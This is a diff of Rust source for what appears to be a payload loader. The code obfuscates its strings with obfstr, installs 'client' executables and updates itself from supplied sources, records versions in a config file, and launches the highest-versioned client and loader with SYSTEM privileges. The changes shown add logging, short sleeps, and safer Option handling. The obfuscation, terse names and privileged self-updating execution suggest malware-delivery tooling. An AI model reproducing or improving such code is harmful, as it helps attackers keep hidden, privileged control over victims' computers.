@@ -1,4 +1,4 @@
-use std::{ fs, io::Write };
+use std::{ fs, io::Write, time::Duration };
 use obfstr::obfstr as s;
 use loader_vars::{
     constants::{ loader_version, system_service_directory },
@@ -13,6 +13,8 @@ use shared::{
         functions::{ generate_random_string, try_spawn_program_as_system },
     },
 };
+
+use crate::info;
 
 pub fn run_config(params: RnCnfgPrms) -> Result<()> {
     if !params.enbl {
@@ -29,17 +31,19 @@ pub fn run_config(params: RnCnfgPrms) -> Result<()> {
     }
     if params.cl_vrs > highest_installed_client_version {
         if let Some(client_source) = params.cl_src {
+            info!("install_client");
             let _ = install_client(client_source, params.cl_vrs);
         }
     } else {
         // this means up to date installed or higher installed.
         // just run
 
-        let highest_client = mib_config.clnts
-            .iter()
-            .max_by_key(|client| client.version)
-            .unwrap();
-        try_spawn_program_as_system(&highest_client.exe_path, None)?;
+        let highest_client = mib_config.clnts.iter().max_by_key(|client| client.version);
+
+        if let Some(cl) = highest_client {
+            info!("spawning client: ", cl);
+            try_spawn_program_as_system(&cl.exe_path, None)?;
+        }
     }
 
     let mut highest_installed_loader_version = loader_version();
@@ -50,17 +54,19 @@ pub fn run_config(params: RnCnfgPrms) -> Result<()> {
     }
     if params.upd_enbl && params.slf_vrs > highest_installed_loader_version {
         if let Some(self_source) = params.slf_src {
+            info!("install_self");
             let _ = install_self(self_source, params.slf_vrs);
         }
     } else {
         // this means up to date installed or higher installed or update disabled
         // just run current
 
-        let highest_loader = mib_config.ldrs
-            .iter()
-            .max_by_key(|loader| loader.version)
-            .unwrap();
-        try_spawn_program_as_system(&highest_loader.exe_path, None)?;
+        let highest_loader = mib_config.ldrs.iter().max_by_key(|loader| loader.version);
+
+        if let Some(ldr) = highest_loader {
+            info!("spawning ldr: ", ldr);
+            try_spawn_program_as_system(&ldr.exe_path, None)?;
+        }
     }
 
     Ok(())
@@ -95,6 +101,7 @@ fn install_client(source: FlSrc, version: u64) -> Result<()> {
     });
 
     write_mib_config(&mib_config)?;
+    std::thread::sleep(Duration::from_millis(300));
 
     try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;
 
@@ -131,6 +138,7 @@ fn install_self(source: FlSrc, version: u64) -> Result<()> {
     });
 
     write_mib_config(&mib_config)?;
+    std::thread::sleep(Duration::from_millis(300));
 
     try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;
 
